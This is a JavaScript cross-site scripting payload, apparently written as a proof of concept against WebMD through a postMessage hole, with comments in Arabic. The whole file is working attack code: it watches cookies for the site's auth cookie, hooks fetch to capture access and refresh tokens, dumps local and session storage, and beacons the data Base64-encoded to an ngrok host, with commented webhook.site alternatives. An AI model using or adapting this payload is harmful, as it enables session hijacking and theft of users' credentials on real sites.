      // evil-script.js - PoC نظيف وبسيط
console.log("Evil script LOADED successfully via postMessage on WebMD!");
alert("XSS PoC: Script injected! Cookies visible in console: " + document.cookie);
         // تشفير الكوكيز بـ Base64 قبل إرسالها
//var stolenData = btoa(document.cookie); 
//new Image().src = "https://webhook.site/01958d43-9c63-44e0-85c8-4df93c65ec75/log?data=" + encodeURIComponent(stolenData);

(function() {
    const attackerURL = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/exfiltrate=";
    //const attackerURL = "https://webhook.site/0bfa1fd8-da82-45ef-bcde-1ae997123369/exfiltrate=";
    // 1. وظيفة التهريب: ترسل البيانات مشفرة Base64 إلى سيرفر المهاجم
    function sendHome(data, type) {
        const payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
        new Image().src = `${attackerURL}?type=${type}&data=${payload}`;
    }

    // 2. مراقب الكوكيز: يسحب الكوكيز الحالية ويراقب أي تغيير (لصيد WBMD_AUTH)
    let lastCookies = "";
    setInterval(() => {
        if (document.cookie !== lastCookies) {
            lastCookies = document.cookie;
            sendHome({ cookies: lastCookies, url: location.href }, "cookies_changed");
        }
    }, 5000);

    // 3. اعتراض الـ API (Fetch): لصيد access_token و refresh_token من الردود
    const originalFetch = window.fetch;
    window.fetch = async (...args) => {
        const response = await originalFetch(...args);
        const clone = response.clone();
        
        clone.json().then(data => {
            // إذا كان الرد يحتوي على أي نوع من التوكينات
            if (data.access_token || data.refresh_token || data.token) {
                sendHome({
                    endpoint: args[0],
                    tokens: data
                }, "api_tokens_intercepted");
            }
        }).catch(() => { /* ليس ملف JSON، يتجاهله */ });

        return response;
    };

    // 4. نهب التخزين: سحب كل ما هو مخزن في LocalStorage و SessionStorage
    const storageData = {
        local: { ...localStorage },
        session: { ...sessionStorage }
    };
    sendHome(storageData, "storage_dump");

    console.log("%c [Security Audit] All observers initialized. Standing by...", "color: red; font-weight: bold;");
})();
